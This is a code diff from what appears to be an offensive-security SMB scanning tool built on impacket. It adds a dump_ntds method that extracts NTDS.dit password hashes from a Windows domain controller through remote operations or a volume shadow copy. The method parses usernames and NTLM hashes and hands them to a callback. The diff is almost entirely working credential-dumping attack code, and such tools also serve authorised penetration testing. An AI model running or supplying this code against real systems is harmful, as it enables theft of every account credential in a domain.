@@ -1,4 +1,5 @@
 import os.path
+import logging
 from time import sleep
 import socket
 import traceback
@@ -17,7 +18,7 @@ from impacket.smb import SMB_DIALECT
 from impacket.smb3structs import SMB2_DIALECT_21
 from impacket.dcerpc.v5 import transport, scmr
 from impacket.dcerpc.v5.rpcrt import DCERPCException
-from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets
+from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes
 
 from .exec.smbexec import SMBEXEC
 from .exec.wmiexec import WMIEXEC
@@ -110,7 +111,7 @@ class SMBScan:
             except AuthFailure:
                 pass
 
-        domain    = self.conn.getServerDNSDomainName()
+        self.domain    = self.conn.getServerDNSDomainName()
         hostname  = self.conn.getServerName()
         try:
             server_os = str(self.conn._SMBConnection.get_server_lanman())
@@ -118,12 +119,12 @@ class SMBScan:
             server_os = str(self.conn.getServerOS())
         signing   = self.conn.isSigningRequired() if self.smbv1 else self.conn._SMBConnection._Connection['RequireSigning']
 
-        if not domain:
-            domain = hostname
+        if not self.domain:
+            self.domain = hostname
 
         smb_info = {}
-        if domain:
-            smb_info['domain'] = domain
+        if self.domain:
+            smb_info['domain'] = self.domain
         if hostname:
             smb_info['hostname'] = hostname
         if server_os:
@@ -608,3 +609,70 @@ class SMBScan:
         decrypted = decrypted[:-padding_bytes]
         return decrypted.decode('utf16')
 
+    def dump_ntds(self, method, callback_func=None):
+        self.enable_remoteops()
+        use_vss_method = False
+        NTDSFileName   = None
+
+        def add_ntds_hash(ntds_hash):
+            try:
+                add_ntds_hash.ntds_hashes += 1
+                if ntds_hash.find('$') == -1:
+                    if ntds_hash.find('\\') != -1:
+                        domain, hash = ntds_hash.split('\\')
+                    else:
+                        domain = self.domain
+                        hash = ntds_hash
+
+                    try:
+                        username,_,lmhash,nthash,_,_,_ = hash.split(':')
+                        parsed_hash = ':'.join((lmhash, nthash))
+                        if callback_func != None:
+                            callback_func({'domain': domain, 'username': username, 'hash': parsed_hash, 'hash_type': 'ntlm'})
+                    except ValueError:
+                        username,hash_type,parsed_hash = hash.split(':')
+                        if callback_func != None:
+                            callback_func({'domain': domain, 'username': username, 'hash': parsed_hash, 'hash_type': hash_type})
+
+                    #if validate_ntlm(parsed_hash):
+                    #    print('%s %s' % username, parsed_hash)
+                    #raise
+                else:
+                    logging.debug("Dumped hash is a computer account, not adding to db")
+            except Exception as e:
+                print('%s: %s' % (type(e), e))
+        add_ntds_hash.ntds_hashes = 0
+
+        if self.remote_ops and self.bootkey:
+            try:
+                if method == 'vss':
+                    NTDSFileName = self.remote_ops.saveNTDS()
+                    use_vss_method = True
+
+                NTDS = NTDSHashes(NTDSFileName, self.bootkey, isRemote=True, history=False, noLMHash=True,
+                                 remoteOps=self.remote_ops, useVSSMethod=use_vss_method, justNTLM=False,
+                                 pwdLastSet=False, resumeSession=None, justUser=None, printUserStatus=False,
+                                 perSecretCallback = lambda secretType, secret : add_ntds_hash(secret))
+
+                #print('Dumping the NTDS, this could take a while so go grab a redbull...')
+                NTDS.dump()
+
+                #print('Dumped {} NTDS hashes'.format(add_ntds_hash.ntds_hashes))
+
+            except Exception as e:
+                #if str(e).find('ERROR_DS_DRA_BAD_DN') >= 0:
+                    # We don't store the resume file if this error happened, since this error is related to lack
+                    # of enough privileges to access DRSUAPI.
+                #    resumeFile = NTDS.getResumeSessionFile()
+                #    if resumeFile is not None:
+                #        os.unlink(resumeFile)
+                raise e
+
+            try:
+                self.remote_ops.finish()
+            except Exception as e:
+                logging.debug("Error calling remote_ops.finish(): {}".format(e))
+
+            NTDS.finish()
+
+            return add_ntds_hash.ntds_hashes
